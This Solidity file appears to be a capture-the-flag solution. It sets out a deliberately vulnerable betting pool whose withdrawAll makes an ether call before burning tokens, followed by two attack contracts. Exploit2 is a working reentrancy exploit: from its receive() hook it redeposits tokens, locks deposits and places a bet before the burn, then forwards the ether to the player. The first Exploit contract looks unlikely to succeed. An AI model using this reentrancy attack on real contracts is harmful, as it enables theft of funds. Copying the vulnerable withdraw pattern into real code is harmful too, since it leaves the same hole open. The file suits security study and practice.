// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {Context} from "@openzeppelin/contracts/utils/Context.sol";

contract BetHouse {
    address public pool;
    uint256 private constant BET_PRICE = 20;
    mapping(address => bool) private bettors;

    error InsufficientFunds();
    error FundsNotLocked();

    constructor(address pool_) {
        pool = pool_;
    }

    function makeBet(address bettor_) external {
        if (Pool(pool).balanceOf(msg.sender) < BET_PRICE) {
            revert InsufficientFunds();
        }
        if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
        bettors[bettor_] = true;
    }

    function isBettor(address bettor_) external view returns (bool) {
        return bettors[bettor_];
    }
}

contract Pool is ReentrancyGuard {
    address public wrappedToken;
    address public depositToken;

    mapping(address => uint256) private depositedEther;
    mapping(address => uint256) private depositedPDT;
    mapping(address => bool) private depositsLockedMap;
    bool private alreadyDeposited;

    error DepositsAreLocked();
    error InvalidDeposit();
    error AlreadyDeposited();
    error InsufficientAllowance();

    constructor(address wrappedToken_, address depositToken_) {
        wrappedToken = wrappedToken_;
        depositToken = depositToken_;
    }

    /**
     * @dev Provide 10 wrapped tokens for 0.001 ether deposited and
     *      1 wrapped token for 1 pool deposit token (PDT) deposited.
     *  The ether can only be deposited once per account.
     */
    function deposit(uint256 value_) external payable {
        // check if deposits are locked
        if (depositsLockedMap[msg.sender]) revert DepositsAreLocked();

        uint256 _valueToMint;
        // check to deposit ether
        if (msg.value == 0.001 ether) {
            if (alreadyDeposited) revert AlreadyDeposited();
            depositedEther[msg.sender] += msg.value;
            alreadyDeposited = true;
            _valueToMint += 10;
        }
        // check to deposit PDT
        if (value_ > 0) {
            if (PoolToken(depositToken).allowance(msg.sender, address(this)) < value_) revert InsufficientAllowance();
            depositedPDT[msg.sender] += value_;
            PoolToken(depositToken).transferFrom(msg.sender, address(this), value_);
            _valueToMint += value_;
        }
        if (_valueToMint == 0) revert InvalidDeposit();
        PoolToken(wrappedToken).mint(msg.sender, _valueToMint);
    }

    function withdrawAll() external nonReentrant {
        // send the PDT to the user
        uint256 _depositedValue = depositedPDT[msg.sender];
        if (_depositedValue > 0) {
            depositedPDT[msg.sender] = 0;
            PoolToken(depositToken).transfer(msg.sender, _depositedValue);
        }

        // send the ether to the user
        _depositedValue = depositedEther[msg.sender];
        if (_depositedValue > 0) {
            depositedEther[msg.sender] = 0;
            payable(msg.sender).call{value: _depositedValue}("");
        }

        PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
    }

    function lockDeposits() external {
        depositsLockedMap[msg.sender] = true;
    }

    function depositsLocked(address account_) external view returns (bool) {
        return depositsLockedMap[account_];
    }

    function balanceOf(address account_) public view returns (uint256) {
        return PoolToken(wrappedToken).balanceOf(account_);
    }
}

contract PoolToken is ERC20, Ownable {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) Ownable(msg.sender) {}

    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }
}

contract Exploit {
    function exploit(address poolAddr, address playerAddr) external payable {
        if (msg.value != 0.002 ether) {
            revert("Invalid deposit amount");
        }

        Depositor depositor1 = new Depositor();
        Depositor depositor2 = new Depositor();

        depositor1.deposit{value: 0.001 ether}(poolAddr, playerAddr);
        depositor2.deposit{value: 0.001 ether}(poolAddr, playerAddr);
    }
}

contract Depositor {
    function deposit(address poolAddr, address playerAddr) external payable {
        if (msg.value != 0.001 ether) {
            revert("Invalid deposit amount");
        }

        Pool pool = Pool(poolAddr);

        pool.deposit{value: msg.value}(0);
        PoolToken(pool.wrappedToken()).transfer(playerAddr, 10);
    }
}

contract Exploit2 {
    BetHouse betHouse;
    Pool pool;
    PoolToken depositToken;
    address player;

    constructor(address betHouseAddr, address playerAddr) {
        betHouse = BetHouse(betHouseAddr);
        pool = Pool(betHouse.pool());
        depositToken = PoolToken(pool.depositToken());
        player = playerAddr;
    }

    function exploit() external payable {
        if (msg.value != 0.001 ether) {
            revert("send 0.001 ether to this contract to exploit");
        }

        // check deposit token balance of this contract
        if (depositToken.balanceOf(address(this)) < 5) {
            revert("transfer 5 deposit tokens to this contract to exploit");
        }

        // deposit 5 deposit tokens and 0.001 ether
        // get 15 wrapped tokens
        depositToken.approve(address(pool), 5);
        pool.deposit{value: msg.value}(5);

        // withdraw all (0.001 ether and 5 deposit tokens)
        pool.withdrawAll();
    }

    // withdrawn ether will be caught here
    receive() external payable {
        // deposit 5 deposit tokens again
        // get 5 wrapped tokens, total count of wrapped tokens is 20
        depositToken.approve(address(pool), 5);
        pool.deposit(5);

        // lock deposits to ensure making bet is possible
        pool.lockDeposits();

        // make bet
        betHouse.makeBet(player);

        // withdraw ether
        player.call{value: address(this).balance}("");
    }
}
